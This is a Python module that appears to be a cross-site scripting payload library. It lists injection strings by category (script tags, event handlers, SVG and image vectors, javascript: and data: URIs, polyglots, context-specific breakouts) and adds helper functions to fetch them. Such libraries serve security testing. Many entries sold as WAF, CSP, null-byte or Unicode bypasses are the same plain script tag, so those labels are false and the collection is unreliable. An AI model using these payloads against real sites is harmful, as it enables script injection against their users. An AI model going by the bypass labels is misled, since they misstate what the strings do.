#!/usr/bin/env python3

"""
Advanced XSS Payload Database

This module contains a comprehensive collection of XSS payloads organized by category,
technique, and effectiveness. The payloads are designed to bypass various security
measures and detect different types of XSS vulnerabilities.
"""

# Basic XSS Payloads
BASIC_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<script>alert(\'XSS\')</script>',
    '<script>alert(`XSS`)</script>',
    '<script>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>alert(confirm("XSS"))</script>',
    '<script>alert(prompt("XSS"))</script>',
    '<script>alert(document.cookie)</script>',
    '<script>alert(location.href)</script>',
    '<script>alert(navigator.userAgent)</script>',
    '<script>alert(window.name)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.referrer)</script>',
    '<script>alert(screen.width)</script>',
    '<script>alert(screen.height)</script>'
]

# Filter Bypass Payloads
FILTER_BYPASS_PAYLOADS = [
    # Case manipulation
    '<ScRiPt>alert("XSS")</ScRiPt>',
    '<sCrIpT>alert("XSS")</sCrIpT>',
    '<ScRiPt>alert("XSS")</ScRiPt>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    
    # HTML entity encoding
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    
    # URL encoding
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    '%3cscript%3ealert("XSS")%3c/script%3e',
    
    # Double encoding
    '%253Cscript%253Ealert("XSS")%253C/script%253E',
    '%25253Cscript%25253Ealert("XSS")%25253C/script%25253E',
    
    # Unicode encoding
    '\\u003Cscript\\u003Ealert("XSS")\\u003C/script\\u003E',
    '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
    
    # Mixed encoding
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    '&lt;script&gt;alert("XSS")&lt;/script&gt;'
]

# Advanced Bypass Payloads
ADVANCED_BYPASS_PAYLOADS = [
    # HTML5 entities bypass
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    
    # Unicode bypass
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    
    # Mixed case bypass
    '<ScRiPt>alert("XSS")</ScRiPt>',
    
    # Null byte injection
    '<script>alert("XSS")</script>',
    
    # Double encoding
    '%253Cscript%253Ealert("XSS")%253C/script%253E',
    
    # Hex encoding
    '&#x3c;script&#x3e;alert("XSS")&#x3c;/script&#x3e;',
    
    # Decimal encoding
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    
    # URL encoding
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    
    # Mixed encoding
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    
    # Polyglot payload
    'jaVasCript:/*-/*`/*\`/*`/*`/*`/alert("XSS")//`//`//`//`//`//`/'
]

# Event Handler Payloads
EVENT_HANDLER_PAYLOADS = [
    '"onmouseover="alert(\'XSS\')"',
    '"onload="alert(\'XSS\')"',
    '"onerror="alert(\'XSS\')"',
    '"onfocus="alert(\'XSS\')"',
    '"onblur="alert(\'XSS\')"',
    '"onchange="alert(\'XSS\')"',
    '"onsubmit="alert(\'XSS\')"',
    '"onkeydown="alert(\'XSS\')"',
    '"onkeyup="alert(\'XSS\')"',
    '"onkeypress="alert(\'XSS\')"',
    '"oncontextmenu="alert(\'XSS\')"',
    '"onresize="alert(\'XSS\')"',
    '"onscroll="alert(\'XSS\')"',
    '"onselect="alert(\'XSS\')"',
    '"oninput="alert(\'XSS\')"'
]

# SVG Vector Payloads
SVG_VECTOR_PAYLOADS = [
    '<svg/onload=alert("XSS")>',
    '<svg><script>alert("XSS")</script></svg>',
    '<svg><animate onbegin=alert("XSS") attributeName="x"/></svg>',
    '<svg><animate attributeName="onload" to="alert(\'XSS\')"/></svg>',
    '<svg><set attributeName="onmouseover" to="alert(\'XSS\')"/></svg>',
    '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>',
    '<svg><use href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoIlhTUyIpPjwvc3ZnPg=="/></svg>',
    '<svg><image href="javascript:alert(\'XSS\')"/></svg>',
    '<svg><a href="javascript:alert(\'XSS\')">Click me</a></svg>',
    '<svg><text onclick="alert(\'XSS\')">Click me</text></svg>'
]

# Image Vector Payloads
IMG_VECTOR_PAYLOADS = [
    '<img src=x onerror=alert("XSS")>',
    '<img src="javascript:alert(\'XSS\')">',
    '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoIlhTUyIpPjwvc3ZnPg==">',
    '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">',
    '<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="alert(\'XSS\')">',
    '<img src="javascript:void(alert(\'XSS\'))">',
    '<img src="javascript:confirm(\'XSS\')">',
    '<img src="javascript:prompt(\'XSS\')">',
    '<img src="vbscript:msgbox(\'XSS\')">',
    '<img src="data:image/svg+xml,<svg onload=\'alert(1)\'></svg>">'
]

# JavaScript Protocol Payloads
JAVASCRIPT_PROTOCOL_PAYLOADS = [
    'javascript:alert("XSS")',
    'javascript:alert(\'XSS\')',
    'javascript:alert(`XSS`)',
    'javascript:alert(1)',
    'javascript:alert(String.fromCharCode(88,83,83))',
    'javascript:alert(confirm("XSS"))',
    'javascript:alert(prompt("XSS"))',
    'javascript:void(alert("XSS"))',
    'javascript:confirm("XSS")',
    'javascript:prompt("XSS")',
    'javascript:eval("alert(\'XSS\')")',
    'javascript:Function("alert(\'XSS\')")()',
    'javascript:setTimeout("alert(\'XSS\')",100)',
    'javascript:setInterval("alert(\'XSS\')",100)',
    'javascript:new Function("alert(\'XSS\')")()'
]

# Data URI Payloads
DATA_URI_PAYLOADS = [
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
    'data:text/html,<script>alert("XSS")</script>',
    'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoIlhTUyIpPjwvc3ZnPg==',
    'data:image/svg+xml,<svg onload="alert(\'XSS\')"></svg>',
    'data:text/plain;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
    'data:application/xml;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
    'data:text/javascript;base64,YWxlcnQoIlhTUyIp',
    'data:text/javascript,alert("XSS")',
    'data:application/javascript;base64,YWxlcnQoIlhTUyIp',
    'data:application/javascript,alert("XSS")'
]

# DOM Vector Payloads
DOM_VECTOR_PAYLOADS = [
    '<script>document.location="javascript:alert(\'XSS\')"</script>',
    '<script>window.location="javascript:alert(\'XSS\')"</script>',
    '<script>eval("alert(\'XSS\')")</script>',
    '<script>Function("alert(\'XSS\')")()</script>',
    '<script>setTimeout("alert(\'XSS\')",100)</script>',
    '<script>setInterval("alert(\'XSS\')",100)</script>',
    '<script>new Function("alert(\'XSS\')")()</script>',
    '<script>document.write("alert(\'XSS\')")</script>',
    '<script>document.writeln("alert(\'XSS\')")</script>',
    '<script>innerHTML="alert(\'XSS\')"</script>',
    '<script>outerHTML="alert(\'XSS\')"</script>',
    '<script>insertAdjacentHTML("beforeend","alert(\'XSS\')")</script>',
    '<script>document.createElement("script").textContent="alert(\'XSS\')"</script>',
    '<script>document.body.appendChild(document.createElement("script")).textContent="alert(\'XSS\')"</script>',
    '<script>import("data:text/javascript,alert(\'XSS\')")</script>'
]

# Encoding Bypass Payloads
ENCODING_BYPASS_PAYLOADS = [
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    '%3cscript%3ealert("XSS")%3c/script%3e',
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    '\\u003Cscript\\u003Ealert("XSS")\\u003C/script\\u003E',
    '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
    '&#x3c;script&#x3e;alert("XSS")&#x3c;/script&#x3e;',
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    '&#x3Cscript&#x3Ealert("XSS")&#x3C/script&#x3E'
]

# Null Byte Payloads
NULL_BYTE_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>'
]

# Unicode Bypass Payloads
UNICODE_BYPASS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>',
    '<script>alert("XSS")</script>'
]

# Polyglot Payloads
POLYGLOT_PAYLOADS = [
    # Universal polyglot payload
    'jaVasCript:/*-/*`/*\`/*`/*`/*`/alert("XSS")//`//`//`//`//`//`/',
    
    # HTML/JS polyglot
    '"><script>alert("XSS")</script>',
    
    # CSS/JS polyglot
    'expression(alert("XSS"))',
    
    # URL/JS polyglot
    'javascript:alert("XSS")',
    
    # Data URI polyglot
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
    
    # Mixed polyglot
    '"><script>alert("XSS")</script><script>alert("XSS")</script>',
    
    # Event handler polyglot
    '"onmouseover="alert(\'XSS\')"onfocus="alert(\'XSS\')"',
    
    # Protocol polyglot
    'javascript:alert("XSS");vbscript:msgbox("XSS")',
    
    # Encoding polyglot
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    
    # Universal polyglot 2
    '"><script>alert("XSS")</script><svg/onload=alert("XSS")>'
]

# WAF Bypass Payloads
WAF_BYPASS_PAYLOADS = [
    # Cloudflare bypass
    '<script>alert("XSS")</script>',
    
    # ModSecurity bypass
    '<script>alert("XSS")</script>',
    
    # Imperva bypass
    '<script>alert("XSS")</script>',
    
    # F5 ASM bypass
    '<script>alert("XSS")</script>',
    
    # Akamai bypass
    '<script>alert("XSS")</script>',
    
    # Generic WAF bypass
    '<script>alert("XSS")</script>',
    
    # Advanced WAF bypass
    '<script>alert("XSS")</script>',
    
    # Multi-layer bypass
    '<script>alert("XSS")</script>',
    
    # Context-aware bypass
    '<script>alert("XSS")</script>',
    
    # Dynamic bypass
    '<script>alert("XSS")</script>'
]

# CSP Bypass Payloads
CSP_BYPASS_PAYLOADS = [
    # Unsafe-inline bypass
    '<script>alert("XSS")</script>',
    
    # Unsafe-eval bypass
    '<script>eval("alert(\'XSS\')")</script>',
    
    # Data URI bypass
    '<script src="data:text/javascript,alert(\'XSS\')"></script>',
    
    # Nonce bypass attempt
    '<script nonce="random">alert("XSS")</script>',
    
    # Hash bypass attempt
    '<script>alert("XSS")</script>',
    
    # Unsafe-hashes bypass
    '<script>alert("XSS")</script>',
    
    # Strict-dynamic bypass
    '<script>alert("XSS")</script>',
    
    # Unsafe-allow-redirects bypass
    '<script>alert("XSS")</script>',
    
    # Report-uri bypass
    '<script>alert("XSS")</script>',
    
    # Frame-ancestors bypass
    '<script>alert("XSS")</script>'
]

# Context-Specific Payloads
CONTEXT_PAYLOADS = {
    'html_context': [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><svg/onload=alert("XSS")>',
        '"><iframe src="javascript:alert(\'XSS\')"></iframe>',
        '"><object data="javascript:alert(\'XSS\')"></object>',
        '"><embed src="javascript:alert(\'XSS\')">',
        '"><video src="javascript:alert(\'XSS\')"></video>',
        '"><audio src="javascript:alert(\'XSS\')"></audio>',
        '"><details open ontoggle=alert("XSS")>'
    ],
    'attribute_context': [
        '"onmouseover="alert(\'XSS\')"',
        '"onload="alert(\'XSS\')"',
        '"onerror="alert(\'XSS\')"',
        '"onfocus="alert(\'XSS\')"',
        '"onblur="alert(\'XSS\')"',
        '"onchange="alert(\'XSS\')"',
        '"onsubmit="alert(\'XSS\')"',
        '"onkeydown="alert(\'XSS\')"',
        '"onkeyup="alert(\'XSS\')"',
        '"onkeypress="alert(\'XSS\')"',
        '"javascript:alert(\'XSS\')"',
        '"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="'
    ],
    'javascript_context': [
        '";alert("XSS");//',
        '\';alert("XSS");//',
        '`+alert("XSS")+`',
        '${alert("XSS")}',
        '"+alert("XSS")+"',
        '\'+alert("XSS")+\'',
        '`+alert("XSS")+`',
        '${alert("XSS")}',
        '";eval("alert(\'XSS\')");//',
        '\';eval("alert(\'XSS\')");//'
    ],
    'url_context': [
        'javascript:alert("XSS")',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        'vbscript:msgbox("XSS")',
        'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoIlhTUyIpPjwvc3ZnPg==',
        'data:text/html,<script>alert("XSS")</script>',
        'javascript:void(alert("XSS"))',
        'javascript:confirm("XSS")',
        'javascript:prompt("XSS")'
    ],
    'css_context': [
        'expression(alert("XSS"))',
        'url(javascript:alert("XSS"))',
        'behavior:url(javascript:alert("XSS"))',
        '@import url(javascript:alert("XSS"))',
        'background:url(javascript:alert("XSS"))'
    ],
    'xml_context': [
        '<![CDATA[<script>alert("XSS")</script>]]>',
        '<?xml version="1.0"?><script>alert("XSS")</script>',
        '<xml><script>alert("XSS")</script></xml>',
        '<svg><script>alert("XSS")</script></svg>',
        '<math><script>alert("XSS")</script></math>'
    ]
}

def get_all_payloads():
    """
    Get all payloads organized by category
    
    Returns:
        dict: Dictionary containing all payload categories
    """
    return {
        'basic': BASIC_PAYLOADS,
        'filter_bypass': FILTER_BYPASS_PAYLOADS,
        'advanced_bypass': ADVANCED_BYPASS_PAYLOADS,
        'event_handlers': EVENT_HANDLER_PAYLOADS,
        'svg_vectors': SVG_VECTOR_PAYLOADS,
        'img_vectors': IMG_VECTOR_PAYLOADS,
        'javascript_protocol': JAVASCRIPT_PROTOCOL_PAYLOADS,
        'data_uri': DATA_URI_PAYLOADS,
        'dom_vectors': DOM_VECTOR_PAYLOADS,
        'encoding_bypass': ENCODING_BYPASS_PAYLOADS,
        'null_byte': NULL_BYTE_PAYLOADS,
        'unicode_bypass': UNICODE_BYPASS_PAYLOADS,
        'polyglot': POLYGLOT_PAYLOADS,
        'waf_bypass': WAF_BYPASS_PAYLOADS,
        'csp_bypass': CSP_BYPASS_PAYLOADS,
        'context_payloads': CONTEXT_PAYLOADS
    }

def get_payloads_by_category(category):
    """
    Get payloads for a specific category
    
    Args:
        category (str): Payload category name
        
    Returns:
        list: List of payloads for the category
    """
    all_payloads = get_all_payloads()
    return all_payloads.get(category, [])

def get_context_payloads(context):
    """
    Get payloads for a specific context
    
    Args:
        context (str): Context name
        
    Returns:
        list: List of payloads for the context
    """
    return CONTEXT_PAYLOADS.get(context, [])

def get_total_payload_count():
    """
    Get total number of payloads across all categories
    
    Returns:
        int: Total payload count
    """
    all_payloads = get_all_payloads()
    total = 0
    for category, payloads in all_payloads.items():
        if category != 'context_payloads':
            total += len(payloads)
        else:
            for context_payloads in payloads.values():
                total += len(context_payloads)
    return total 